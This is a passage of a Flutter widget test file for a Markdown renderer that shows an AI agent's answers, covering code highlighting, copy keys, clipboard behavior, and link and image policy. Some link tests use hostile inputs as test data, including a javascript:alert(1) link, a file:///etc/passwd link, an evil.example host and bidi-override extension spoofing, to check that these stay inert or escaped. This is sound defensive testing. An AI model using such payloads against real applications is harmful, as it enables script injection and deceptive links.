      'built once each', (tester) async {
    const block = '```dart\nfinal same = 1;\n```';
    await pumpMd(tester, 'First:\n\n$block\n\nSecond:\n\n$block\n');

    expect(find.byKey(const ValueKey('code-copy-agent-1-0')), findsOneWidget);
    expect(find.byKey(const ValueKey('code-copy-agent-1-1')), findsOneWidget);
    expect(CodeLabMarkdownStats.codeBlockBuilds['agent-1-0'], 1);
    expect(CodeLabMarkdownStats.codeBlockBuilds['agent-1-1'], 1);
  });

  testWidgets('a code block inside a quote gets its own unique copy key', (
    tester,
  ) async {
    await pumpMd(
      tester,
      '> ```dart\n> final q = 1;\n> ```\n\n```dart\nfinal p = 2;\n```\n',
    );
    expect(tester.takeException(), isNull);
    final keys = {
      for (final w in tester.widgetList<CodeLabButton>(
        find.byType(CodeLabButton),
      ))
        w.key,
    };
    expect(keys, hasLength(2));
    expect(CodeLabMarkdownStats.codeBlockBuilds.values, everyElement(1));
  });

  testWidgets('theme change in the transcript restyles the answer', (
    tester,
  ) async {
    final rows = [const CodeLabAgentTextRow(id: 'agent-1', text: 'Plain text')];
    await tester.pumpWidget(_panelHost(rows));
    await tester.pump();
    expect(
      _styleValue(_richTextWith(tester, 'Plain text'), (s) => s.color),
      _lightTheme.resources.textFillColorPrimary,
    );

    await tester.pumpWidget(_panelHost(rows, brightness: Brightness.dark));
    await tester.pump(const Duration(seconds: 1));
    expect(
      _styleValue(_richTextWith(tester, 'Plain text'), (s) => s.color),
      _darkTheme.resources.textFillColorPrimary,
    );
  });

  testWidgets('image placeholder escapes control and direction characters', (
    tester,
  ) async {
    // `NetworkImage` берёт клиента через свой провайдер, мимо `HttpOverrides`.
    // Сбрасывается в конце теста: инварианты painting проверяются до tearDown.
    debugNetworkImageHttpClientProvider = _ForbiddenHttpClient.new;
    try {
      await pumpMd(
        tester,
        '![](https://example.invalid/%E2%80%AEgpj.png%0Aname.png)\n\n'
        '![](https://evil%E2%80%AE.example/x.png)',
      );
      expect(tester.takeException(), isNull);
      for (final placeholder in tester.widgetList<CodeLabText>(
        find.descendant(
          of: find.byType(CodeLabImagePlaceholder),
          matching: find.byType(CodeLabText),
        ),
      )) {
        expect(placeholder.data, isNot(contains(String.fromCharCode(0x202E))));
        expect(placeholder.data, isNot(contains('\n')));
      }
      expect(
        find.textContaining('\\u202e', findRichText: true),
        findsAtLeastNWidgets(1),
      );
    } finally {
      debugNetworkImageHttpClientProvider = null;
    }
  });

  test(
    'escapeForDisplay shows control and direction characters as escapes',
    () {
      // Ожидание строится из кода символа: сами невидимые символы в исходнике
      // форматтер превращает в литералы.
      const units = [
        0x0000,
        0x000A,
        0x001F,
        0x007F,
        0x0085,
        0x009F,
        0x061C,
        0x200B,
        0x200C,
        0x200D,
        0x200E,
        0x200F,
        0x2028,
        0x2029,
        0x202A,
        0x202E,
        0x2066,
        0x2069,
        0xFEFF,
      ];
      for (final unit in units) {
        final hex = unit.toRadixString(16).padLeft(4, '0');
        expect(
          escapeForDisplay('a${String.fromCharCode(unit)}b'),
          'a\\u${hex}b',
          reason: 'U+$hex',
        );
      }
      expect(
        escapeForDisplay('https://x.example/a b?q=1'),
        'https://x.example/a b?q=1',
      );
      expect(escapeForDisplay('Привет ✓ 😀'), 'Привет ✓ 😀');
    },
  );

  testWidgets('links are inert plain text until the app enables them', (
    tester,
  ) async {
    // `NetworkImage` берёт клиента через свой провайдер, мимо `HttpOverrides`.
    // Сбрасывается в конце теста: инварианты painting проверяются до tearDown.
    debugNetworkImageHttpClientProvider = _ForbiddenHttpClient.new;
    try {
      // Итерация 4 вводит активные ссылки по политике app (D5); до этого ссылка
      // не имеет ни recognizer, ни курсора, ни акцентного цвета и подчёркивания.
      await pumpMd(
        tester,
        'See [docs](https://example.invalid/a?token=abc) and '
        '[![pic](https://example.invalid/i.png)](https://example.invalid/l) '
        'and ![d](data:image/svg+xml;base64,PHN2Zy8+).',
      );
      expect(tester.takeException(), isNull);
      final text = _richTextWith(tester, 'docs');
      final primary = FluentTheme.of(
        tester.element(find.byType(CodeLabMarkdown)),
      ).resources.textFillColorPrimary;
      var spans = 0;
      text.text.visitChildren((span) {
        if (span is TextSpan) {
          spans++;
          expect(
            span.recognizer,
            isNull,
            reason: 'recognizer on "${span.text}"',
          );
          expect(span.mouseCursor, MouseCursor.defer);
          if (span.text != null && span.text!.contains('docs')) {
            expect(span.style?.color, primary);
            expect(span.style?.decoration, anyOf(isNull, TextDecoration.none));
          }
        }
        return true;
      });
      expect(spans, greaterThan(0));

      await tester.tap(find.textContaining('docs', findRichText: true));
      await tester.pump(const Duration(seconds: 1));
      expect(tester.takeException(), isNull);
      // Картинки (в том числе внутри ссылки и `data:`) — заглушки, сеть
      // проверяет tearDown.
      expect(find.byType(Image), findsNothing);
      expect(find.byType(CodeLabImagePlaceholder), findsAtLeastNWidgets(2));
    } finally {
      debugNetworkImageHttpClientProvider = null;
    }
  });

  testWidgets('the answer is not a Tab stop', (tester) async {
    await pumpMd(tester, 'Some answer');
    final region = tester.widget<SelectableRegion>(
      find.byType(SelectableRegion),
    );
    expect(region.focusNode!.skipTraversal, isTrue);
  });

  testWidgets('a rebuilt code block keeps its copy key', (tester) async {
    // Новая конфигурация той же темы заставляет пакет вызвать builder'ы блоков
    // заново при том же тексте; `State` блока сохраняется, и ключ не должен
    // уйти на запасной номер.
    const text =
        'A\n\n```dart\nfinal same = 1;\n```\n\nB\n\n```dart\nfinal same = 1;\n```\n';
    for (var round = 0; round < 3; round++) {
      await tester.pumpWidget(
        _host(
          CodeLabMarkdown(
            id: 'agent-1',
            text: text,
            config: CodeLabMarkdownConfig(_lightTheme),
          ),
        ),
      );
      await tester.pump();
    }
    expect(find.byKey(const ValueKey('code-copy-agent-1-0')), findsOneWidget);
    expect(find.byKey(const ValueKey('code-copy-agent-1-1')), findsOneWidget);
    expect(find.byType(CodeLabButton), findsNWidgets(2));
    expect(CodeLabMarkdownStats.codeBlockMounts.values, everyElement(1));
  });

  test('the row model claims block numbers in order and frees them', () {
    const text = '```dart\nx\n```\n\n```dart\nx\n```\n\n```go\ny\n```';
    final model = CodeLabMarkdownRowModel()
      ..update(id: 'a', blocks: scanFencedBlocks(text));
    expect(model.claim('dart', 'x', true), 0);
    expect(model.claim('dart', 'x', true), 1);
    expect(model.claim('go', 'y', true), 2);
    // Блок, которого сканер не нашёл, получает уникальный номер.
    final unknown1 = model.claim('rust', 'z', true);
    final unknown2 = model.claim('rust', 'z', true);
    expect(unknown1, greaterThanOrEqualTo(3));
    expect(unknown2, isNot(unknown1));
    // Размонтированный блок освобождает номер.
    model.release(0);
    expect(model.claim('dart', 'x', true), 0);
  });

  testWidgets(
    'Cmd or Ctrl+C copies the selection without the language label',
    (tester) async {
      final clipboard = <String>[];
      tester.binding.defaultBinaryMessenger.setMockMethodCallHandler(
        SystemChannels.platform,
        (call) async {
          if (call.method == 'Clipboard.setData') {
            clipboard.add((call.arguments as Map)['text'] as String);
          }
          return null;
        },
      );
      addTearDown(
        () => tester.binding.defaultBinaryMessenger.setMockMethodCallHandler(
          SystemChannels.platform,
          null,
        ),
      );
      await pumpMd(
        tester,
        'Intro paragraph.\n\n```dart\nfinal a = 1;\n```\n\nOutro.',
      );
      final region = tester.state<SelectableRegionState>(
        find.byType(SelectableRegion),
      );
      tester
          .widget<SelectableRegion>(find.byType(SelectableRegion))
          .focusNode!
          .requestFocus();
      await tester.pump();
      region.selectAll();
      await tester.pump();

      final modifier = defaultTargetPlatform == TargetPlatform.macOS
          ? LogicalKeyboardKey.metaLeft
          : LogicalKeyboardKey.controlLeft;
      await tester.sendKeyDownEvent(modifier);
      await tester.sendKeyEvent(LogicalKeyboardKey.keyC);
      await tester.sendKeyUpEvent(modifier);
      await tester.pump(const Duration(seconds: 1));

      expect(clipboard, isNotEmpty);
      expect(clipboard.last, contains('Intro paragraph.'));
      expect(clipboard.last, contains('final a = 1;'));
      expect(clipboard.last, isNot(contains('dart')));
    },
    variant: const TargetPlatformVariant({
      TargetPlatform.macOS,
      TargetPlatform.linux,
      TargetPlatform.windows,
    }),
  );

  testWidgets(
    'the context menu stays inside the window near the bottom right corner',
    (tester) async {
      tester.view.physicalSize = const Size(400, 300);
      tester.view.devicePixelRatio = 1;
      addTearDown(tester.view.resetPhysicalSize);
      addTearDown(tester.view.resetDevicePixelRatio);
      await tester.pumpWidget(
        FluentApp(
          home: Align(
            alignment: Alignment.bottomRight,
            child: SizedBox(
              width: 160,
              child: CodeLabMarkdown(id: 'agent-1', text: 'Corner text here'),
            ),
          ),
        ),
      );
      await tester.pump();
      final target = find.textContaining('Corner', findRichText: true);
      final gesture = await tester.startGesture(
        tester.getBottomRight(target) - const Offset(6, 4),
        kind: PointerDeviceKind.mouse,
        buttons: kSecondaryMouseButton,
      );
      await gesture.up();
      await tester.pump();

      final menu = tester.getRect(find.byType(FlyoutContent));
      expect(menu.right, lessThanOrEqualTo(400));
      expect(menu.bottom, lessThanOrEqualTo(300));
      expect(menu.left, greaterThanOrEqualTo(0));
      expect(menu.top, greaterThanOrEqualTo(0));
    },
    variant: TargetPlatformVariant.only(TargetPlatform.macOS),
  );

  // ---- Подсветка кода (итерация 3, задача 3.1; D4, DSK-5, DSK-6) ----

  /// Цвета листьев текста, в который собран код [needle]; один цвет — код без
  /// подсветки.
  Set<Color> codeColors(WidgetTester tester, String needle) {
    final text = _richTextWith(tester, needle);
    final colors = <Color>{};
    text.text.visitChildren((span) {
      if (span is TextSpan && (span.text ?? '').isNotEmpty) {
        final color = span.style?.color ?? text.text.style?.color;
        if (color != null) colors.add(color);
      }
      return true;
    });
    if (colors.isEmpty && text.text.style?.color != null) {
      colors.add(text.text.style!.color!);
    }
    return colors;
  }

  Widget mdWith(
    CodeLabCodeHighlighter highlighter,
    String text, {
    FluentThemeData? theme,
    Brightness brightness = Brightness.light,
    bool streaming = false,
  }) => _host(
    CodeLabMarkdown(
      id: 'agent-1',
      text: text,
      streaming: streaming,
      config: CodeLabMarkdownConfig(
        theme ?? (brightness == Brightness.dark ? _darkTheme : _lightTheme),
        highlighter: highlighter,
      ),
    ),
    brightness: brightness,
  );

  List<CodeLabCodeToken> keywordToken(int length) => [
    CodeLabCodeToken(0, length, CodeLabTokenClass.keyword),
  ];

  testWidgets('small closed block is highlighted in the first build', (
    tester,
  ) async {
    final highlighter = CodeLabCodeHighlighter(
      tokenizer: (language, code) => keywordToken(5),
    );
    await tester.pumpWidget(
      mdWith(highlighter, '```dart\nfinal a = 1;\n```\n'),
    );
    await tester.pump();

    final palette = CodeLabCodeTheme.of(_lightTheme);
    final colors = codeColors(tester, 'final a');
    expect(colors, contains(palette.colorOf(CodeLabTokenClass.keyword)));
    expect(colors.length, greaterThan(1));
    expect(CodeLabMarkdownStats.highlightRuns, 1);
    expect(CodeLabMarkdownStats.highlightSyncRuns, 1);
    // Синхронная подсветка не требует перерисовки блока.
    expect(CodeLabMarkdownStats.codeBlockBuilds['agent-1-0'], 1);
  });

  testWidgets('large code block is highlighted off the UI isolate', (
    tester,
  ) async {
    final result = Completer<List<CodeLabCodeToken>>();
    var backgroundCalls = 0;
    final highlighter = CodeLabCodeHighlighter(
      background: (language, code) {
        backgroundCalls++;
        return result.future;
      },
      tokenizer: (language, code) =>
          fail('must not tokenize on the UI isolate'),
    );
    final code = [for (var i = 0; i < 1000; i++) 'final v$i = $i;'].join('\n');
    await tester.pumpWidget(mdWith(highlighter, '```dart\n$code\n```\n'));
    await tester.pump();

    // До результата код показан без цвета.
    expect(CodeLabMarkdownStats.highlightSyncRuns, 0);
    expect(backgroundCalls, 1);
    expect(codeColors(tester, 'final v0'), hasLength(1));
    expect(CodeLabMarkdownStats.codeBlockBuilds['agent-1-0'], 1);

    result.complete(keywordToken(5));
    await tester.pump();
    await tester.pump();

    // После результата блок перерисован один раз и подсвечен.
    expect(CodeLabMarkdownStats.highlightSyncRuns, 0);
    expect(CodeLabMarkdownStats.highlightRuns, 1);
    expect(CodeLabMarkdownStats.codeBlockBuilds['agent-1-0'], 2);
    expect(codeColors(tester, 'final v0').length, greaterThan(1));
    expect(backgroundCalls, 1);
  });

  testWidgets('a background result after unmount is not applied', (
    tester,
  ) async {
    final result = Completer<List<CodeLabCodeToken>>();
    final highlighter = CodeLabCodeHighlighter(
      background: (language, code) => result.future,
    );
    final code = [for (var i = 0; i < 1000; i++) 'final v$i = $i;'].join('\n');
    await tester.pumpWidget(mdWith(highlighter, '```dart\n$code\n```\n'));
    await tester.pump();
    expect(CodeLabMarkdownStats.codeBlockMounts['agent-1-0'], 1);

    await tester.pumpWidget(const SizedBox.shrink());
    result.complete(keywordToken(5));
    await tester.pump();

    // `setState` после dispose падал бы исключением; результат отброшен и
    // блок не строился повторно.
    await tester.pump();
    expect(tester.takeException(), isNull);
    expect(CodeLabMarkdownStats.codeBlockBuilds['agent-1-0'], 1);
  });

  testWidgets('a background result for an old code is not applied to the new '
      'code', (tester) async {
    // Стрим дописал блок, пока фон считал прежний код: токены старого кода
    // нельзя применять к новому тексту.
    final results = <String, Completer<List<CodeLabCodeToken>>>{};
    final highlighter = CodeLabCodeHighlighter(
      background: (language, code) =>
          (results[code] = Completer<List<CodeLabCodeToken>>()).future,
    );
    String big(String prefix) =>
        [for (var i = 0; i < 1000; i++) '$prefix v$i = $i;'].join('\n');
    final codeA = big('final');
    final codeB = big('const');
    await tester.pumpWidget(mdWith(highlighter, '```dart\n$codeA\n```\n'));
    await tester.pump();
    await tester.pumpWidget(mdWith(highlighter, '```dart\n$codeB\n```\n'));
    await tester.pump();
    expect(results, hasLength(2));
    expect(CodeLabMarkdownStats.codeBlockMounts['agent-1-0'], 1);

    // Результат старого кода приходит первым и не окрашивает новый текст.
    results[codeA]!.complete([
      const CodeLabCodeToken(0, 5, CodeLabTokenClass.keyword),
      const CodeLabCodeToken(0, 999999, CodeLabTokenClass.string),
    ]);
    await tester.pump();
    await tester.pump();
    expect(tester.takeException(), isNull);
    expect(codeColors(tester, 'const v0'), hasLength(1));

    // Результат нового кода применяется.
    results[codeB]!.complete(keywordToken(5));
    await tester.pump();
    await tester.pump();
    expect(codeColors(tester, 'const v0').length, greaterThan(1));
  });

  testWidgets('two identical large blocks share one background run', (
    tester,
  ) async {
    final result = Completer<List<CodeLabCodeToken>>();
    var calls = 0;
    final highlighter = CodeLabCodeHighlighter(
      background: (language, code) {
        calls++;
        return result.future;
      },
    );
    final code = [for (var i = 0; i < 1000; i++) 'final v$i = $i;'].join('\n');
    await tester.pumpWidget(
      mdWith(highlighter, '```dart\n$code\n```\n\n```dart\n$code\n```\n'),
    );
    await tester.pump();
    expect(calls, 1);
    expect(CodeLabMarkdownStats.highlightRuns, 1);

    result.complete(keywordToken(5));
    await tester.pump();
    await tester.pump();
    for (final element
        in find.textContaining('final v0', findRichText: true).evaluate()) {
      expect(element, isNotNull);
    }
    expect(find.byType(CodeLabCodeBlock), findsNWidgets(2));
    expect(calls, 1);
  });

  testWidgets('a background run that never ends leaves the block plain', (
    tester,
  ) async {
    final highlighter = CodeLabCodeHighlighter(
      background: (language, code) =>
          Completer<List<CodeLabCodeToken>>().future,
    );
    final code = [for (var i = 0; i < 1000; i++) 'final v$i = $i;'].join('\n');
    await tester.pumpWidget(mdWith(highlighter, '```dart\n$code\n```\n'));
    await tester.pump();
    await tester.pump(const Duration(seconds: 6));
    await tester.pump();

    // Отчёт о таймауте: язык и причина, без текста кода.
    final reported = tester.takeException();
    expect(reported.toString(), contains('dart'));
    expect(reported.toString(), contains('Timeout'));
    expect(reported.toString(), isNot(contains('final v0')));
    expect(codeColors(tester, 'final v0'), hasLength(1));
    expect(tester.takeException(), isNull);
  });

  testWidgets('a pair of surrogates is never split by a token', (tester) async {
    final highlighter = CodeLabCodeHighlighter();
    for (final entry in {
      'latex': '\\\u{1F600} x',
      'clojure': '(str \\\u{1F600})',
    }.entries) {
      await tester.pumpWidget(
        mdWith(highlighter, '```${entry.key}\n${entry.value}\n```\n'),
      );
      await tester.pump();
      expect(tester.takeException(), isNull, reason: entry.key);
      expect(
        find.textContaining('\u{1F600}', findRichText: true),
        findsOneWidget,
        reason: entry.key,
      );
    }
  });

  testWidgets('the language label is escaped and shortened', (tester) async {
    final rlo = String.fromCharCode(0x202E);
    await tester.pumpWidget(
      _host(
        CodeLabMarkdown(
          id: 'agent-1',
          text: '```${rlo}gpj\nx\n```\n\n```${'a' * 100}\nx\n```\n',
        ),
      ),
    );
    await tester.pump();

    expect(find.textContaining(rlo, findRichText: true), findsNothing);
    expect(find.text('\\u202egpj'), findsOneWidget);
    final long = tester
        .widgetList<CodeLabText>(find.byType(CodeLabText))
        .map((w) => w.data)
        .where((d) => d.startsWith('aaa'))
        .single;
    expect(long.length, 32);
    expect(long.endsWith('…'), isTrue);
  });

  testWidgets('the language label is cut only above 32 characters', (
    tester,
  ) async {
    final exact = 'b' * 32;
    final over = 'c' * 33;
    await tester.pumpWidget(
      _host(
        CodeLabMarkdown(
          id: 'agent-1',
          text: '```$exact\nx\n```\n\n```$over\nx\n```\n',
        ),
      ),
    );
    await tester.pump();

    // Ровно 32 символа — без обрезки; 33 — 31 символ и многоточие.
    expect(find.text(exact), findsOneWidget);
    expect(find.text('${'c' * 31}…'), findsOneWidget);
    expect(find.text(over), findsNothing);
  });

  testWidgets('code over 5000 lines is shown whole and never highlighted', (
    tester,
  ) async {
    var backgroundCalls = 0;
    final highlighter = CodeLabCodeHighlighter(
      background: (language, code) {
        backgroundCalls++;
        return Future.value(keywordToken(5));
      },
      tokenizer: (language, code) => fail('must not tokenize'),
    );
    final code = [for (var i = 0; i < 5001; i++) 'v$i'].join('\n');
    await tester.pumpWidget(mdWith(highlighter, '```dart\n$code\n```\n'));
    await tester.pump();

    expect(backgroundCalls, 0);
    expect(CodeLabMarkdownStats.highlightRuns, 0);
    expect(codeColors(tester, 'v0'), hasLength(1));
    expect(find.textContaining('v5000', findRichText: true), findsOneWidget);
  });

  testWidgets('unknown language and no language stay plain', (tester) async {
    final highlighter = CodeLabCodeHighlighter(
      tokenizer: (language, code) => fail('must not tokenize'),
    );
    await tester.pumpWidget(
      mdWith(
        highlighter,
        '```foolang\nfinal a = 1;\n```\n\n```\nfinal b = 2;\n```\n\n'
        '```text\nfinal c = 3;\n```\n',
      ),
    );
    await tester.pump();

    expect(CodeLabMarkdownStats.highlightRuns, 0);
    for (final needle in ['final a', 'final b', 'final c']) {
      expect(codeColors(tester, needle), hasLength(1), reason: needle);
    }
    // Подпись неизвестного языка видна, «Copy» работает (ключ есть).
    expect(find.text('foolang'), findsOneWidget);
    expect(find.byKey(const ValueKey('code-copy-agent-1-0')), findsOneWidget);
  });

  testWidgets('unclosed fence is plain and is highlighted once after close', (
    tester,
  ) async {
    final highlighter = CodeLabCodeHighlighter(
      tokenizer: (language, code) => keywordToken(5),
    );
    const before = 'Before the block.\n\n';
    await tester.pumpWidget(
      mdWith(highlighter, '$before```dart\nfinal a = 1;', streaming: true),
    );
    await tester.pump();
    expect(CodeLabMarkdownStats.highlightRuns, 0);
    expect(codeColors(tester, 'final a'), hasLength(1));
    final paragraph = tester.element(
      find.byWidgetPredicate(
        (w) => w is RichText && w.text.toPlainText().contains('Before the'),
      ),
    );

    await tester.pumpWidget(
      mdWith(
        highlighter,
        '$before```dart\nfinal a = 1;\n```\n',
        streaming: true,
      ),
    );
    await tester.pump();

    expect(CodeLabMarkdownStats.highlightRuns, 1);
    expect(codeColors(tester, 'final a').length, greaterThan(1));
    expect(
      tester.element(
        find.byWidgetPredicate(
          (w) => w is RichText && w.text.toPlainText().contains('Before the'),
        ),
      ),
      same(paragraph),
    );
  });

  testWidgets('the dark theme uses the dark palette', (tester) async {
    final highlighter = CodeLabCodeHighlighter(
      tokenizer: (language, code) => keywordToken(5),
    );
    const text = '```dart\nfinal a = 1;\n```\n';
    await tester.pumpWidget(
      mdWith(highlighter, text, brightness: Brightness.dark),
    );
    await tester.pump();

    final dark = CodeLabCodeTheme.of(_darkTheme);
    final light = CodeLabCodeTheme.of(_lightTheme);
    final colors = codeColors(tester, 'final a');
    expect(colors, contains(dark.colorOf(CodeLabTokenClass.keyword)));
    expect(colors, isNot(contains(light.colorOf(CodeLabTokenClass.keyword))));
    // Фон блока — из палитры, а не светлый.
    final block = tester.widget<DecoratedBox>(
      find
          .descendant(
            of: find.byType(CodeLabCodeBlock),
            matching: find.byType(DecoratedBox),
          )
          .first,
    );
    expect((block.decoration as BoxDecoration).color, dark.background);
  });

  // ---- Ссылки и изображения по политике app (итерация 4, задачи 4.1 и 4.3;
  // design.md D2, D5, D6; DSK-7, VIEW-12) ----
  //
  // Политику (`canOpenLink`, `canLoadImage`) задаёт app и передаёт через
  // `CodeLabMarkdownScope`; кит только рисует и сообщает о клике. В тестах
  // кита политика — простые функции ниже, настоящая живёт в
  // `link_policy.dart` приложения.

  final pngBytes = base64Decode(
    'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA'
    '60e6kgAAAABJRU5ErkJggg==',
  );

  bool canOpen(Uri uri) =>
      ((uri.scheme == 'http' || uri.scheme == 'https') &&
          uri.host.isNotEmpty) ||
      (uri.scheme == 'mailto' && uri.path.isNotEmpty);
  bool canLoad(Uri uri) => uri.scheme == 'https' && uri.host.isNotEmpty;

  /// Состояние «приложения» в тесте: что открыто, что показано, сколько раз
  /// запросили изображение.
  final shown = ValueNotifier<Set<String>>({});
  final opened = <Uri>[];
  final imageRequests = <Uri>[];
  late ImageProvider image;

  // Функции политики устойчивы между сборками, как в app (tear-off метода
  // Cubit и функции верхнего уровня): смена `shownImages` — единственное, что
  // меняется у scope (ревью итерации 4, MINOR 8).
  ImageProvider imageForTest(Uri uri) {
    imageRequests.add(uri);
    return image;
  }

  void onShowImageTest(String key) => shown.value = {...shown.value, key};

  Widget withPolicy(Widget child) => ValueListenableBuilder<Set<String>>(
    valueListenable: shown,
    builder: (context, shownImages, _) => CodeLabMarkdownScope(
      canOpenLink: canOpen,
      onOpenLink: opened.add,
      canLoadImage: canLoad,
      imageFor: imageForTest,
      shownImages: shownImages,
      onShowImage: onShowImageTest,
      child: child,
    ),
  );

  setUp(() {
    shown.value = {};
    opened.clear();
    imageRequests.clear();
    image = MemoryImage(pngBytes);
  });

  testWidgets(
    'link tap calls onOpenLink and non-http schemes are not tappable',
    (tester) async {
      await tester.pumpWidget(
        _host(
          withPolicy(
            const CodeLabMarkdown(
              id: 'agent-1',
              text:
                  '[docs](https://example.com/a?token=abc)\n\n'
                  '[mail](mailto:dev@example.com)\n\n'
                  '[js](javascript:alert(1))\n\n'
                  '[file](file:///etc/passwd)\n\n'
                  '[data](data:text/html,hi)\n\n'
                  '[vsc](vscode://open)\n\n'
                  '[rel](//evil.example/a)\n\n'
                  '<xmpp:a@b>',
            ),
          ),
        ),
      );
      await tester.pump();
      expect(tester.takeException(), isNull);

      // Клик отдаёт адрес из ссылки, а не её текст (`onLinkTap` пакета даёт
      // только текст — прототип, факт 4).
      await tester.tap(find.textContaining('docs', findRichText: true));
      await tester.pump(const Duration(seconds: 1));
      expect(opened, [Uri.parse('https://example.com/a?token=abc')]);

      await tester.tap(find.textContaining('mail', findRichText: true));
      await tester.pump(const Duration(seconds: 1));
      expect(opened.last, Uri.parse('mailto:dev@example.com'));
      expect(opened, hasLength(2));

      // Остальные схемы — обычный текст: ни recognizer, ни вызова.
      for (final label in ['js', 'file', 'data', 'vsc', 'rel', 'xmpp:a@b']) {
        final finder = find.textContaining(label, findRichText: true);
        expect(finder, findsAtLeastNWidgets(1), reason: label);
        await tester.tap(finder.first);
        await tester.pump(const Duration(seconds: 1));
        final text = _richTextWith(tester, label);
        text.text.visitChildren((span) {
          if (span is TextSpan) {
            expect(span.recognizer, isNull, reason: 'recognizer on $label');
          }
          return true;
        });
      }
      expect(
        opened,
        hasLength(2),
        reason: 'inactive links never call the port',
      );
    },
  );

  testWidgets('an active link is underlined in the accent color', (
    tester,
  ) async {
    await tester.pumpWidget(
      _host(
        withPolicy(
          const CodeLabMarkdown(
            id: 'agent-1',
            text: '[docs](https://example.com/a)\n\n[js](javascript:alert(1))',
          ),
        ),
      ),
    );
    await tester.pump();

    final theme = FluentTheme.of(tester.element(find.byType(CodeLabMarkdown)));
    final accent = theme.accentColor.defaultBrushFor(theme.brightness);
    final active = _richTextWith(tester, 'docs');
    expect(_styleValue(active, (s) => s.decoration), TextDecoration.underline);
    expect(_styleValue(active, (s) => s.color), accent);

    final inactive = _richTextWith(tester, 'js');
    expect(
      _styleValue(inactive, (s) => s.decoration),
      anyOf(isNull, TextDecoration.none),
    );
    expect(_styleValue(inactive, (s) => s.color), isNot(accent));
  });

  /// Ведёт мышь к началу текста [needle] и возвращает жест.
  Future<TestGesture> hoverText(WidgetTester tester, String needle) async {
    final mouse = await tester.createGesture(kind: PointerDeviceKind.mouse);
    await mouse.addPointer(location: const Offset(1, 1));
    addTearDown(mouse.removePointer);
    final target = find.textContaining(needle, findRichText: true).first;
    await mouse.moveTo(tester.getTopLeft(target) + const Offset(4, 6));
    await tester.pump();
    return mouse;
  }

  testWidgets('a link tooltip shows the full address on hover and leaves '
      'with the pointer (own Fluent overlay)', (tester) async {
    final rlo = String.fromCharCode(0x202E);
    await tester.pumpWidget(
      _host(
        withPolicy(
          CodeLabMarkdown(
            id: 'agent-1',
            text:
                '[docs](https://example.com/a?token=abc)\n\n'
                '[bidi](https://example.com/${rlo}gpj)',
          ),
        ),
      ),
    );
    await tester.pump();
    expect(find.text('https://example.com/a?token=abc'), findsNothing);

    final mouse = await hoverText(tester, 'docs');
    expect(find.text('https://example.com/a?token=abc'), findsOneWidget);

    // Уход курсора убирает подсказку.
    await mouse.moveTo(const Offset(590, 590));
    await tester.pump();
    expect(find.text('https://example.com/a?token=abc'), findsNothing);

    // Управляющие и bidi-символы показаны escape-последовательностью.
    final bidi = find.textContaining('bidi', findRichText: true).first;
    await mouse.moveTo(tester.getTopLeft(bidi) + const Offset(4, 6));
    await tester.pump();
    expect(find.text('https://example.com/\\u202egpj'), findsOneWidget);
    expect(find.textContaining(rlo), findsNothing);
  });

  testWidgets('the link tooltip goes away when the row text changes under a '
      'still pointer', (tester) async {
    await tester.pumpWidget(
      _host(
        withPolicy(
          const CodeLabMarkdown(
            id: 'agent-1',
            text: '[docs](https://example.com/a)',
          ),
        ),
      ),
    );
    await tester.pump();
    await hoverText(tester, 'docs');
    expect(find.text('https://example.com/a'), findsOneWidget);

    // Строка перестроилась (другая сессия, правка стрима), курсор не двигался:
    // `onExit` старого спана не придёт, подсказка должна уйти сама.
    await tester.pumpWidget(
      _host(
        withPolicy(
          const CodeLabMarkdown(
            id: 'agent-9',
            text: 'Another answer entirely.',
          ),
        ),
      ),
    );
    await tester.pump();

    expect(find.text('https://example.com/a'), findsNothing);
  });

  testWidgets('the link tooltip with an old address goes away when the same '
      'row now links elsewhere', (tester) async {
    Widget row(String url) =>
        _host(withPolicy(CodeLabMarkdown(id: 'agent-1', text: '[docs]($url)')));
    await tester.pumpWidget(row('https://example.com/old'));
    await tester.pump();
    await hoverText(tester, 'docs');
    expect(find.text('https://example.com/old'), findsOneWidget);

    // Тот же абзац и та же позиция под неподвижным курсором, но ссылка уже
    // ведёт на другой адрес: подсказка со старым адресом ввела бы в
    // заблуждение (ревью итерации 4).
    await tester.pumpWidget(row('https://example.com/new'));
    await tester.pump();

    expect(find.text('https://example.com/old'), findsNothing);
  });

  testWidgets('the link tooltip is removed with the widget', (tester) async {
    await tester.pumpWidget(
      _host(
        withPolicy(
          const CodeLabMarkdown(
            id: 'agent-1',
            text: '[docs](https://example.com/a)',
          ),
        ),
      ),
    );
    await tester.pump();
    await hoverText(tester, 'docs');
    expect(find.text('https://example.com/a'), findsOneWidget);

    await tester.pumpWidget(const SizedBox.shrink());
    await tester.pump();

    expect(find.text('https://example.com/a'), findsNothing);
    expect(tester.takeException(), isNull);
  });

  testWidgets('a very long address is cut to 2048 characters in the tooltip', (
    tester,
  ) async {
    final url = 'https://example.com/${'a' * 5000}';
    await tester.pumpWidget(
      _host(withPolicy(CodeLabMarkdown(id: 'agent-1', text: '[docs]($url)'))),
    );
    await tester.pump();
    await hoverText(tester, 'docs');

    final shownText = tester
        .widgetList<CodeLabText>(find.byType(CodeLabText))
        .map((w) => w.data)
        .where((d) => d.startsWith('https://example.com/aaa'))
        .single;
    expect(shownText.length, lessThanOrEqualTo(2049));
    expect(shownText.endsWith('…'), isTrue);
  });

  testWidgets('a long link label wraps with its paragraph', (tester) async {
    final label = List.generate(60, (i) => 'word$i').join(' ');
    await tester.pumpWidget(
      _host(
        withPolicy(
          CodeLabMarkdown(
            id: 'agent-1',
            text: 'See [$label](https://example.com/a) for details.',
          ),
        ),
      ),
    );
    await tester.pump();

    expect(tester.takeException(), isNull);
    // `WidgetSpan` не переносился бы: подпись в несколько строк даёт высоту
    // абзаца в разы больше одной строки.
    final paragraph = find.byWidgetPredicate(
      (w) => w is RichText && w.text.toPlainText().contains('word59'),
    );
    expect(tester.getSize(paragraph.first).height, greaterThan(60));
    await tester.tap(find.textContaining('word59', findRichText: true));
    await tester.pump(const Duration(seconds: 1));
    expect(opened, [Uri.parse('https://example.com/a')]);
  });

  testWidgets('scope updates with an equal policy do not rebuild images', (
    tester,
  ) async {
    await tester.pumpWidget(
      _host(
        withPolicy(
          const CodeLabMarkdown(
            id: 'agent-1',
            text: '![](https://x.example/y.png)',
          ),
        ),
      ),
    );
    await tester.pump();
    final builds = CodeLabMarkdownStats.imagePlaceholderBuilds;
    expect(builds, greaterThan(0));

    // Пустой набор пересоздаётся при каждом обновлении ленты (как в app).
    for (var i = 0; i < 5; i++) {
      shown.value = <String>{};
      await tester.pump();
    }

